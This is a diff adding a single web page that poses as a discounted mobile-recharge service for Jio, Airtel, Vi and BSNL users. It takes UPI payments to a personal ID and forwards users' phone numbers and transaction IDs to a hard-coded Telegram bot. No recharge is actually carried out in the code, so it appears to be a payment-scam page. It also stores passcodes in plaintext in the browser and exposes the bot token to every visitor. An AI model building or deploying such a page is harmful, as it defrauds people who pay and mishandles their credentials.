@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abhishek Recharge & Earn</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f4f6f9;
+            color: #333;
+        }
+        .offer-banner {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        header {
+            background: #ffffff;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-area h1 {
+            font-size: 22px;
+            color: #ff416c;
+        }
+        .user-balance {
+            font-size: 14px;
+            background: #eef2f7;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+        .container {
+            max-width: 450px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #666;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #ff416c;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #e0355b;
+        }
+        .switch-text {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #007bff;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
+        .plan-card {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .plan-details h4 {
+            color: #2c3e50;
+            font-size: 15px;
+        }
+        .plan-details p {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+        .price-tag {
+            text-align: right;
+        }
+        .original-price {
+            text-decoration: line-through;
+            font-size: 12px;
+            color: #999;
+        }
+        .discount-price {
+            font-size: 16px;
+            font-weight: bold;
+            color: #27ae60;
+        }
+        .pay-btn {
+            background: #27ae60;
+            padding: 6px 12px;
+            font-size: 13px;
+            margin-top: 5px;
+            width: auto;
+        }
+        .upi-box {
+            background: #f8f9fa;
+            border: 1px dashed #007bff;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .upi-id {
+            font-weight: bold;
+            color: #007bff;
+            font-size: 16px;
+            margin: 5px 0;
+        }
+        .app-links {
+            display: flex;
+            justify-content: space-around;
+            margin: 15px 0;
+        }
+        .app-links a {
+            padding: 8px 15px;
+            background: #007bff;
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Offer Banner -->
+    <div class="offer-banner">
+        🔥 Special Offer: Get Flat 5% OFF on all Recharges between ₹299 to ₹400! Limited Time Only! 🔥
+    </div>
+
+    <!-- Header -->
+    <header>
+        <div class="logo-area">
+            <span style="font-size: 24px;">⚡</span>
+            <h1>Abhishek</h1>
+        </div>
+        <div id="userBalanceBox" class="user-balance hidden">
+            Bal: ₹<span id="displayBalance">0</span>
+        </div>
+    </header>
+
+    <div class="container">
+        
+        <!-- AUTH SECTION -->
+        <div id="authSection">
+            <h2 id="authTitle">Register Account</h2>
+            <div class="form-group">
+                <label>Mobile Number</label>
+                <input type="number" id="authPhone" placeholder="Enter 10 digit mobile number">
+            </div>
+            <div class="form-group">
+                <label>Passcode (PIN)</label>
+                <input type="password" id="authPass" placeholder="Enter passcode">
+            </div>
+            <button id="authBtn" onclick="handleAuth()">Register</button>
+            <div class="switch-text" id="switchText" onclick="toggleAuthMode()">Already have an account? Login</div>
+        </div>
+
+        <!-- DASHBOARD SECTION (Recharge Input & Plans) -->
+        <div id="dashboardSection" class="hidden">
+            <h2>Recharge Portal</h2>
+            
+            <div class="form-group">
+                <label>Recharge Mobile Number</label>
+                <input type="number" id="rechargePhone" placeholder="Enter 10 digit number">
+            </div>
+
+            <div class="form-group">
+                <label>Select Company / Operator</label>
+                <select id="operatorSelect" onchange="loadPlans()">
+                    <option value="">-- Choose Operator --</option>
+                    <option value="jio">Jio / JioBharat</option>
+                    <option value="airtel">Airtel</option>
+                    <option value="vi">Vi (Vodafone Idea)</option>
+                    <option value="bsnl">BSNL</option>
+                </select>
+            </div>
+
+            <div id="plansContainer" class="hidden">
+                <h3 style="font-size: 15px; margin: 15px 0 10px 0; color: #444;">Available Plans (₹299 - ₹400) [5% OFF]</h3>
+                <div id="plansList"></div>
+            </div>
+
+            <hr style="margin: 20px 0;">
+            <button style="background: #007bff;" onclick="showAddMoney()">Add Money to Wallet (Min ₹100)</button>
+            <button style="background: #e74c3c; margin-top: 10px;" onclick="logout()">Logout</button>
+        </div>
+
+        <!-- ADD MONEY SECTION -->
+        <div id="paymentSection" class="hidden">
+            <h2>Add Balance to Wallet</h2>
+            <div class="form-group">
+                <label>Enter Amount (Min ₹100)</label>
+                <input type="number" id="addAmountInput" placeholder="Enter amount">
+            </div>
+            <button onclick="proceedToPay()">Proceed to Pay</button>
+            <button style="background:#6c757d;" onclick="backToDashboard()">Back</button>
+        </div>
+
+        <!-- GATEWAY & SCREENSHOT UPLOAD -->
+        <div id="gatewaySection" class="hidden">
+            <h2>Complete Payment</h2>
+            <div class="upi-box">
+                <p>Pay using any UPI App to:</p>
+                <div class="upi-id" id="targetUpi">laxmihi@ptyes</div>
+                <p style="font-size:12px; color:#555;">Amount: <b id="payAmountText"></b></p>
+            </div>
+
+            <div class="app-links">
+                <a id="paytmLink" href="#">Paytm</a>
+                <a id="phonepeLink" href="#">PhonePe</a>
+                <a id="gpayLink" href="#">Google Pay</a>
+            </div>
+
+            <div class="form-group">
+                <label>Enter UTR / Transaction ID (12 Digits)</label>
+                <input type="text" id="utrInput" placeholder="Enter UTR Number">
+            </div>
+            <div class="form-group">
+                <label>Upload Payment Screenshot</label>
+                <input type="file" id="screenshotInput" accept="image/*">
+            </div>
+            <button style="background: #27ae60;" onclick="submitPaymentProof()">Submit Payment Proof</button>
+            <button style="background:#6c757d;" onclick="backToDashboard()">Cancel</button>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8947143631:AAG-HUtTtWgPmAtlqwE09LuWdnk8ecnlEAE";
+        const CHAT_ID = "7742143795";
+        const UPI_ID = "laxmihi@ptyes";
+
+        let isLoginMode = false;
+        let currentUser = null;
+        let currentTxnAmount = 0;
+        let selectedPlanDetails = "";
+
+        // All operators plans data strictly between 299 and 400
+        const allPlans = {
+            jio: [
+                { price: 299, desc: "Jio: 1.5 GB/Day, 28 Days, Unlimited Calls" },
+                { price: 349, desc: "Jio: 2.0 GB/Day, 28 Days, Unlimited Calls" },
+                { price: 399, desc: "Jio: 3.0 GB/Day + Disney+ Hotstar, 28 Days" }
+            ],
+            airtel: [
+                { price: 299, desc: "Airtel: 1.5 GB/Day, 28 Days, Unlimited Calls" },
+                { price: 359, desc: "Airtel: 2.0 GB/Day, 1 Month Validity, Xstream" },
+                { price: 399, desc: "Airtel: 2.5 GB/Day, 28 Days, Fast Data" }
+            ],
+            vi: [
+                { price: 299, desc: "Vi: 1.5 GB/Day, 28 Days, Binge All Night" },
+                { price: 319, desc: "Vi: 2 GB/Day, 30 Days, Weekend Data Rollover" },
+                { price: 379, desc: "Vi: 6GB Data Pack + Unlimited Calls, 30 Days" }
+            ],
+            bsnl: [
+                { price: 299, desc: "BSNL: 3 GB/Day, 30 Days, Unlimited Voice" },
+                { price: 397, desc: "BSNL: 2 GB/Day + Calls, 150 Days Validity" }
+            ]
+        };
+
+        function toggleAuthMode() {
+            isLoginMode = !isLoginMode;
+            document.getElementById("authTitle").innerText = isLoginMode ? "Login Account" : "Register Account";
+            document.getElementById("authBtn").innerText = isLoginMode ? "Login" : "Register";
+            document.getElementById("switchText").innerText = isLoginMode ? "Don't have an account? Register" : "Already have an account? Login";
+        }
+
+        function handleAuth() {
+            let phone = document.getElementById("authPhone").value;
+            let pass = document.getElementById("authPass").value;
+
+            if(!phone || phone.length < 10 || !pass) {
+                alert("Please enter a valid mobile number and passcode.");
+                return;
+            }
+
+            let users = JSON.parse(localStorage.getItem("users") || "{}");
+
+            if(!isLoginMode) {
+                if(users[phone]) {
+                    alert("Number already registered! Please login.");
+                    return;
+                }
+                users[phone] = { pass: pass, balance: 0 };
+                localStorage.setItem("users", JSON.stringify(users));
+                alert("Registration Successful! Please login.");
+                toggleAuthMode();
+            } else {
+                if(users[phone] && users[phone].pass === pass) {
+                    currentUser = phone;
+                    localStorage.setItem("currentUser", phone);
+                    loadDashboard();
+                } else {
+                    alert("Invalid mobile number or passcode!");
+                }
+            }
+        }
+
+        function loadDashboard() {
+            let phone = localStorage.getItem("currentUser");
+            if(!phone) return;
+            currentUser = phone;
+
+            let users = JSON.parse(localStorage.getItem("users") || "{}");
+            let balance = users[phone] ? users[phone].balance : 0;
+
+            document.getElementById("displayBalance").innerText = balance;
+            document.getElementById("userBalanceBox").classList.remove("hidden");
+            document.getElementById("authSection").classList.add("hidden");
+            document.getElementById("dashboardSection").classList.remove("hidden");
+            document.getElementById("paymentSection").classList.add("hidden");
+            document.getElementById("gatewaySection").classList.add("hidden");
+        }
+
+        function loadPlans() {
+            let operator = document.getElementById("operatorSelect").value;
+            let container = document.getElementById("plansContainer");
+            let plansList = document.getElementById("plansList");
+
+            if(!operator) {
+                container.classList.add("hidden");
+                return;
+            }
+
+            plansList.innerHTML = "";
+            let operatorPlans = allPlans[operator] || [];
+
+            operatorPlans.forEach(plan => {
+                let discountPrice = Math.round(plan.price * 0.95); // 5% discount
+                plansList.innerHTML += `
+                    <div class="plan-card">
+                        <div class="plan-details">
+                            <h4>₹${plan.price} Plan</h4>
+                            <p>${plan.desc}</p>
+                        </div>
+                        <div class="price-tag">
+                            <div class="original-price">₹${plan.price}</div>
+                            <div class="discount-price">₹${discountPrice}</div>
+                            <button class="pay-btn" onclick="initiateRecharge(${discountPrice}, '${plan.desc}')">Recharge</button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.classList.remove("hidden");
+        }
+
+        function showAddMoney() {
+            document.getElementById("dashboardSection").classList.add("hidden");
+            document.getElementById("paymentSection").classList.remove("hidden");
+        }
+
+        function backToDashboard() {
+            loadDashboard();
+        }
+
+        function proceedToPay() {
+            let amt = parseInt(document.getElementById("addAmountInput").value);
+            if(isNaN(amt) || amt < 100) {
+                alert("Minimum amount to add is ₹100");
+                return;
+            }
+            currentTxnAmount = amt;
+            selectedPlanDetails = "Wallet Top-up: ₹" + amt;
+            setupGateway(amt);
+        }
+
+        function initiateRecharge(amount, desc) {
+            let targetMobile = document.getElementById("rechargePhone").value;
+            if(!targetMobile || targetMobile.length < 10) {
+                alert("Please enter the target mobile number for recharge first!");
+                return;
+            }
+            currentTxnAmount = amount;
+            selectedPlanDetails = `Recharge Number: ${targetMobile} | Plan: ${desc} | Paid: ₹${amount}`;
+            setupGateway(amount);
+        }
+
+        function setupGateway(amount) {
+            document.getElementById("paymentSection").classList.add("hidden");
+            document.getElementById("dashboardSection").classList.add("hidden");
+            document.getElementById("gatewaySection").classList.remove("hidden");
+            document.getElementById("payAmountText").innerText = "₹" + amount;
+
+            let upiLink = `upi://pay?pa=${UPI_ID}&pn=AbhishekRecharge&am=${amount}&cu=INR`;
+            document.getElementById("paytmLink").href = upiLink;
+            document.getElementById("phonepeLink").href = upiLink;
+            document.getElementById("gpayLink").href = upiLink;
+        }
+
+        function submitPaymentProof() {
+            let utr = document.getElementById("utrInput").value;
+            let fileInput = document.getElementById("screenshotInput");
+
+            if(!utr || utr.length < 6) {
+                alert("Please enter a valid UTR / Transaction ID.");
+                return;
+            }
+
+            let message = `🚨 *New Transaction / Recharge Request* 🚨\n\n👤 *Logged User:* ${currentUser}\n📦 *Details:* ${selectedPlanDetails}\n🔖 *UTR / Txn ID:* ${utr}\n🌐 *UPI ID:* ${UPI_ID}`;
+            
+            let telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    alert("Payment proof submitted successfully! Details sent to Telegram.");
+                    document.getElementById("utrInput").value = "";
+                    fileInput.value = "";
+                    loadDashboard();
+                } else {
+                    alert("Failed to send notification to Telegram.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Something went wrong!");
+            });
+        }
+
+        function logout() {
+            localStorage.removeItem("currentUser");
+            location.reload();
+        }
+
+        window.onload = function() {
+            if(localStorage.getItem("currentUser")) {
+                loadDashboard();
+            }
+        }
+    </script>
+</body>
+</html>
